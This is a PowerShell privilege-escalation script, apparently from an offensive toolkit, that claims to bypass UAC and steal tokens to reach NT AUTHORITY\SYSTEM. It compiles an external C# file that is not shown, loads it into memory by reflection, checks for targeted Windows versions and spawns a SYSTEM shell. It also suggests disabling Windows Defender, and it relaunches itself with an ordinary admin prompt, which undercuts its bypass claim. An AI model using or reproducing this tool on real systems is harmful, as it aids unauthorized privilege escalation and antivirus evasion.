<#
    Author: P.Hoogeveen | aka: x0xr00t
    Name: UAC & System Elevation Wrapper
    Method: C# Reflection / Token Stealing
    Description: Bypasses UAC and elevates to SYSTEM using C# reflection and token manipulation.
    Updated: Added OS version check for Windows 10, 11, Server 2019/2022
#>

function Get-PSLocation {
    $paths = @(
        "C:\Program Files\PowerShell\7\pwsh.exe",
        "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    )

    foreach ($path in $paths) {
        if (Test-Path $path) {
            return $path
        }
    }

    Write-Host "[-] PowerShell location not found." -ForegroundColor Red
    exit
}

function Invoke-X0x-Bypass {
    $workPath = "$env:TEMP\X0X_Work"
    $dllPath = Join-Path $workPath "sl0p.dll"
    $csFile = Join-Path $PSScriptRoot "sl0puacb.cs"

    # 1. Check if the C# source file exists
    if (-not (Test-Path $csFile)) {
        Write-Host "[-] Error: $csFile not found in the current directory!" -ForegroundColor Red
        return
    }

    # 2. Create working directory if it doesn't exist
    if (-not (Test-Path $workPath)) {
        New-Item -Path $workPath -ItemType Directory -Force | Out-Null
    }

    # 3. Compile the C# code with required assemblies
    Write-Host "[*] OS: $((Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').ProductName)" -ForegroundColor Cyan
    Write-Host "[*] Compiling C# source code..." -ForegroundColor Yellow

    $Assemblies = @(
        "System",
        "System.Drawing",
        "System.Windows.Forms",
        "System.Runtime.InteropServices",
        "System.Security"
    )

    try {
        $sourceCode = Get-Content $csFile -Raw
        Add-Type -TypeDefinition $sourceCode `
                 -ReferencedAssemblies $Assemblies `
                 -OutputAssembly $dllPath `
                 -OutputType Library
        Write-Host "[+] Compilation successful: $dllPath" -ForegroundColor Green
    } catch {
        Write-Host "[-] Compilation error: $_" -ForegroundColor Red
        return
    }

    # 4. Load DLL via memory reflection (byte array)
    try {
        $bytes = [IO.File]::ReadAllBytes($dllPath)
        [System.Reflection.Assembly]::Load($bytes) | Out-Null
        Write-Host "[+] DLL successfully loaded into memory via reflection." -ForegroundColor Green
    } catch {
        Write-Host "[-] Load failed: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "[!] Tip: Try 'Unblock-File $csFile' or temporarily disable Windows Defender." -ForegroundColor Yellow
        return
    }

    # 5. Execute the Main routine from the C# code
    Write-Host "[*] Initializing elevation to SYSTEM..." -ForegroundColor Magenta
    try {
        [Program]::Main(@())
        Start-Sleep -Seconds 2

        $newIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        Write-Host "[*] New Context: $newIdentity" -ForegroundColor Cyan

        if ($newIdentity -like "*SYSTEM*") {
            Write-Host "[!!!] SUCCESS: You are now running as NT AUTHORITY\SYSTEM!" -ForegroundColor Green
            Write-Host "[*] Spawning new SYSTEM shell..." -ForegroundColor Yellow

            # Spawn a new red-themed SYSTEM shell and close the current terminal
            $PSLocation = Get-PSLocation
            $command = @"
                `$Host.UI.RawUI.BackgroundColor = 'DarkRed'
                `$Host.UI.RawUI.ForegroundColor = 'White'
                Clear-Host
                Write-Host '[!!!] You are now NT AUTHORITY\SYSTEM. Type `exit` to end the session.' -ForegroundColor Yellow
                Write-Host '[*] Current user: ' -NoNewline -ForegroundColor Cyan
                Write-Host "$([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)" -ForegroundColor Green
"@
            Start-Process -FilePath "$PSLocation" -ArgumentList "-NoExit", "-Command", $command -Verb RunAs -WindowStyle Normal
            exit
        } else {
            Write-Host "[?] SYSTEM context not obtained. Try running PowerShell as Administrator." -ForegroundColor Yellow
        }
    } catch {
        Write-Host "[-] Error executing Main: $_" -ForegroundColor Red
    }
}

# --- OS Version Check ---
Write-Host "---------------------------------------"
Write-Host " Sl0ppyR00t: Checking OS version..."
Write-Host "---------------------------------------"

$OSVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ProductName).ProductName
$supportedVersions = @(
    "Windows 10 Home",
    "Windows 10 Pro",
    "Windows 10 Education",
    "Windows 10 Enterprise",
    "Windows 10 Enterprise 2015",
    "Windows 10 Mobile and Mobile Enterprise",
    "Windows 10 IoT Core",
    "Windows 10 IoT Enterprise LTSC 2021",
    "Windows 10 IoT Mobile Enterprise",
    "Windows Server 2019 Standard",
    "Windows Server 2019 Datacenter",
    "Windows Server 2019 Essentials",
    "Windows Server 2019 Azure Core",
    "Windows Server 2022 Standard",
    "Windows Server 2022 Datacenter",
    "Windows Server 2022 Azure Core",
    "Windows 11 Home",
    "Windows 11 Pro",
    "Windows 11 Education",
    "Windows 11 Enterprise",
    "Windows 11 IoT Enterprise",
    "Windows 11 IoT Mobile Enterprise",
    "Windows 11 Team",
    "Windows 11 Enterprise Multi-session"
)

if ($supportedVersions -notcontains $OSVersion) {
    Write-Host "[-] Unsupported OS version: $OSVersion" -ForegroundColor Red
    exit
} else {
    Write-Host "[+] Running on supported OS: $OSVersion" -ForegroundColor Green
}

# --- Start the procedure ---
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[!] WARNING: This script requires Administrator privileges." -ForegroundColor Red
    $PSLocation = Get-PSLocation
    Start-Process -FilePath "$PSLocation" -ArgumentList '-NoExit', '-File', $MyInvocation.MyCommand.Definition -Verb RunAs
    exit
}

Invoke-X0x-Bypass
